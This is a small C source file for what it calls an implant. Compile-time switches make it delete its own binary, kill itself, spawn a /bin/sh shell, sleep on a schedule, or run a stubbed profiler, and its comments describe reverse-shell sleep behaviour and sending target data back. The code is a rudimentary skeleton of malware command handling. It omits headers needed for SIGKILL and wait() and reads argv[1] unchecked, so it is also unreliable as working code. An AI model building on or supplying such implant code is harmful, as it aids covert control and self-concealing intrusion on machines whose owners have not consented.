#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>


int main(int argc, char * argv[]) {


#ifdef UNINSTALL
    remove(argv[0]);
#endif



#ifdef EXIT
//"EXIT": When this command is received the implant will kill itself, but will not uninstall
   kill(getpid(), SIGKILL);
#endif



#ifdef SHELL
    int proc = fork();
    if(proc >= 1){//parent
        wait(NULL);//wait until child terminates
    }
    else if (proc == 0){//child process
        execl ("/bin/sh", "sh", NULL);
    }
#endif



#ifdef SLEEP
/*
 *"SLEEP": The implant initially sleep N seconds, set at compile time. If a reverse shell, the client will update its internal default sleep state to N seconds and end the connection. It will then operate on that new sleep schedule before attempting its next connection. 
*/
    int sleepTime = atoi(argv[1]);
    sleep(sleepTime);
#endif



#ifdef PROFILING
//"PROFILER": If this command is received the implant will run the profiler function and send back as much data as collected on the target
//valhelper
#endif




return 0;

}

